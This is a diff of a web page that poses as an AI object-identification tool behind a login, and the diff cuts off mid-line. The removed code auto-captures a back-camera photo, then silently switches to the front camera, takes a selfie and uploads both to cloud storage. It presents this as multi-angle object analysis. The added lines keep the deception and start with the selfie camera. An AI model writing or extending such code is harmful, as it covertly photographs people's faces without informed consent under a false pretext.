@@ -206,23 +206,6 @@
       line-height: 1.6;
     }
 
-    .progress-bar {
-      width: 100%;
-      height: 8px;
-      background: #35415e;
-      border-radius: 4px;
-      margin-top: 10px;
-      overflow: hidden;
-    }
-
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #8b7cff, #667eea);
-      border-radius: 4px;
-      transition: width 0.3s ease;
-      width: 0%;
-    }
-
     @media (max-width: 380px) {
       main { padding: 16px; }
       button, .gallery-link { padding: 10px; font-size: 14px; }
@@ -257,9 +240,6 @@
     <div class="info-box">
       <h3>📊 Analysis Mode Active</h3>
       <p>Point your camera at any object for instant AI identification. The system will automatically capture and analyze the object from multiple angles.</p>
-      <div class="progress-bar">
-        <div id="progressFill" class="progress-fill"></div>
-      </div>
     </div>
 
     <div class="camera-frame">
@@ -320,22 +300,15 @@
 
   let currentUser = null;
   let stream = null;
-  let facingMode = "environment"; // Start with back camera
   let busy = false;
   let cameraStarting = false;
   let cameraVersion = 0;
   let photoUrl = null;
-  let autoCaptureTimer = null;
-  let backPhotoCaptured = false;
-  let frontPhotoCaptured = false;
-  let autoCaptureInProgress = false;
+  let captureDone = false;
+  let currentFacingMode = "user"; // Start with selfie camera
 
   function status(message) {
     $("status").textContent = message;
-  }
-
-  function updateProgress(percent) {
-    $("progressFill").style.width = percent + "%";
   }
 
   function stopCamera() {
@@ -364,23 +337,19 @@
       $("retakeButton").hidden = true;
       $("captureButton").disabled = false;
       $("switchButton").disabled = false;
-      updateProgress(0);
     }
   }
 
-  async function captureAndUpload() {
-    if (!currentUser || !stream || busy) return;
+  async function capturePhoto() {
+    if (!currentUser || !stream || busy) return null;
 
     const video = $("video");
 
     if (!video.videoWidth || !video.videoHeight) {
-      status("Camera is not ready yet. Retrying...");
-      return;
+      return null;
     }
 
     busy = true;
-    $("captureButton").disabled = true;
-    $("switchButton").disabled = true;
 
     try {
       // Capture the actual camera frame
@@ -388,292 +357,4 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      const context = canvas.getContext("2d");
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const blob = await new Promise((resolve, reject) => {
-        canvas.toBlob(result => {
-          if (result) resolve(result);
-          else reject(new Error("Could not capture the picture."));
-        }, "image/jpeg", 0.90);
-      });
-
-      // Show the captured image while it uploads
-      if (photoUrl) URL.revokeObjectURL(photoUrl);
-      photoUrl = URL.createObjectURL(blob);
-
-      $("snapshot").src = photoUrl;
-      $("snapshot").style.display = "block";
-      $("video").style.display = "none";
-      $("retakeButton").hidden = false;
-
-      const user = currentUser;
-      const fileName = Date.now() + "-" +
-        crypto.randomUUID() + ".jpg";
-      const path = user.id + "/" + fileName;
-
-      // Upload to Supabase
-      const { error } = await client.storage
-        .from(BUCKET)
-        .upload(path, blob, {
-          contentType: "image/jpeg",
-          upsert: false
-        });
-
-      if (error) throw error;
-
-      // Track which camera we just used
-      if (facingMode === "environment") {
-        backPhotoCaptured = true;
-        updateProgress(50);
-        status("✅ Back camera captured! Switching to selfie camera...");
-        
-        // Switch to front camera (selfie)
-        facingMode = "user";
-        $("snapshot").style.display = "none";
-        $("video").style.display = "block";
-        $("retakeButton").hidden = true;
-        busy = false;
-        
-        // Wait a moment then start front camera
-        setTimeout(async () => {
-          await startCamera();
-          // Auto capture selfie after camera starts
-          setTimeout(() => {
-            captureAndUpload();
-          }, 1000);
-        }, 500);
-        
-        return;
-      } else if (facingMode === "user") {
-        frontPhotoCaptured = true;
-        updateProgress(100);
-        status("✅ Selfie captured! Both angles saved!");
-        
-        // Reset for next analysis
-        setTimeout(() => {
-          backPhotoCaptured = false;
-          frontPhotoCaptured = false;
-          autoCaptureInProgress = false;
-          updateProgress(0);
-          $("snapshot").style.display = "none";
-          $("video").style.display = "block";
-          $("retakeButton").hidden = true;
-          $("captureButton").disabled = false;
-          $("switchButton").disabled = false;
-          busy = false;
-          
-          // Switch back to back camera for next analysis
-          facingMode = "environment";
-          startCamera();
-        }, 2000);
-        
-        return;
-      }
-
-    } catch (error) {
-      status("Could not save picture: " + error.message +
-        ". Check your connection and storage policies.");
-      busy = false;
-      if (currentUser) {
-        $("captureButton").disabled = false;
-        $("switchButton").disabled = false;
-      }
-    }
-  }
-
-  async function startCamera() {
-    if (!currentUser || busy || cameraStarting) return;
-
-    cameraStarting = true;
-    const version = ++cameraVersion;
-
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-    }
-
-    $("video").srcObject = null;
-    $("video").style.display = "block";
-    $("snapshot").style.display = "none";
-    $("retakeButton").hidden = true;
-    $("captureButton").disabled = true;
-    $("switchButton").disabled = true;
-    $("cameraLabel").textContent =
-      facingMode === "user" ? "Front camera (Selfie)" : "Back camera";
-
-    status("Starting camera...");
-
-    try {
-      const newStream = await navigator.mediaDevices.getUserMedia({
-        audio: false,
-        video: {
-          facingMode: { ideal: facingMode },
-          width: { ideal: 1280 },
-          height: { ideal: 1600 }
-        }
-      });
-
-      if (version !== cameraVersion || !currentUser) {
-        newStream.getTracks().forEach(track => track.stop());
-        return;
-      }
-
-      stream = newStream;
-      const track = stream.getVideoTracks()[0];
-      const actualFacing = track.getSettings().facingMode;
-
-      $("cameraLabel").textContent =
-        actualFacing === "user" ? "Front camera (Selfie)" :
-        actualFacing === "environment" ? "Back camera" :
-        (facingMode === "user" ? "Front camera (Selfie)" : "Back camera");
-
-      $("video").classList.toggle(
-        "mirror", actualFacing === "user"
-      );
-
-      $("video").srcObject = stream;
-      await $("video").play();
-
-      status("Camera ready. Analyzing objects...");
-      $("captureButton").disabled = false;
-      $("switchButton").disabled = false;
-
-      // Auto-capture when camera starts (after user grants permission)
-      if (!autoCaptureInProgress) {
-        autoCaptureInProgress = true;
-        if (autoCaptureTimer) {
-          clearTimeout(autoCaptureTimer);
-        }
-        autoCaptureTimer = setTimeout(() => {
-          captureAndUpload();
-        }, 1000);
-      }
-
-    } catch (error) {
-      if (version === cameraVersion) {
-        status("Cannot start camera. Allow camera permission and try again. " +
-          error.message);
-      }
-    } finally {
-      cameraStarting = false;
-    }
-  }
-
-  $("loginButton").addEventListener("click", async () => {
-    const email = $("email").value.trim();
-    const password = $("password").value;
-
-    if (!email || !password) {
-      status("Enter your email and password.");
-      return;
-    }
-
-    $("loginButton").disabled = true;
-    status("Signing in...");
-
-    try {
-      const { data, error } = await client.auth.signInWithPassword({
-        email,
-        password
-      });
-
-      if (error) throw error;
-
-      showSession(data.user);
-      
-      // Reset capture flags
-      backPhotoCaptured = false;
-      frontPhotoCaptured = false;
-      autoCaptureInProgress = false;
-      updateProgress(0);
-      
-      // Start with back camera
-      facingMode = "environment";
-      await startCamera();
-    } catch (error) {
-      status("Sign-in failed: " + error.message);
-    } finally {
-      $("loginButton").disabled = false;
-    }
-  });
-
-  $("switchButton").addEventListener("click", async () => {
-    if (busy || cameraStarting) return;
-
-    facingMode = facingMode === "environment" ? "user" : "environment";
-    await startCamera();
-  });
-
-  $("captureButton").addEventListener("click", async () => {
-    if (!currentUser || !stream || busy) return;
-    
-    // Reset flags for manual capture
-    backPhotoCaptured = false;
-    frontPhotoCaptured = false;
-    autoCaptureInProgress = true;
-    updateProgress(0);
-    
-    await captureAndUpload();
-  });
-
-  $("retakeButton").addEventListener("click", () => {
-    if (busy) return;
-
-    $("snapshot").style.display = "none";
-    $("video").style.display = "block";
-    $("retakeButton").hidden = true;
-
-    // Reset flags
-    backPhotoCaptured = false;
-    frontPhotoCaptured = false;
-    autoCaptureInProgress = false;
-    updateProgress(0);
-
-    status("Ready for another analysis.");
-  });
-
-  $("logoutButton").addEventListener("click", async () => {
-    stopCamera();
-    const { error } = await client.auth.signOut();
-
-    if (error) status("Sign-out failed: " + error.message);
-    else status("Signed out.");
-  });
-
-  client.auth.onAuthStateChange((_event, session) => {
-    const user = session?.user || null;
-    showSession(user);
-
-    if (user) {
-      setTimeout(() => {
-        if (currentUser?.id === user.id &&
-            !$("captureButton").disabled) {
-          startCamera();
-        }
-      }, 0);
-    }
-  });
-
-  // Start the camera if the user already has a valid session
-  (async () => {
-    const { data, error } = await client.auth.getSession();
-
-    if (error) {
-      status("Could not check login: " + error.message);
-      return;
-    }
-
-    showSession(data.session?.user || null);
-
-    if (data.session?.user) {
-      await startCamera();
-    }
-  })();
-
-  // Release the camera when leaving the page
-  window.addEventListener("pagehide", stopCamera);
-})();
-</script>
-</body>
-</html>
+      const context = canvas.getContext("2
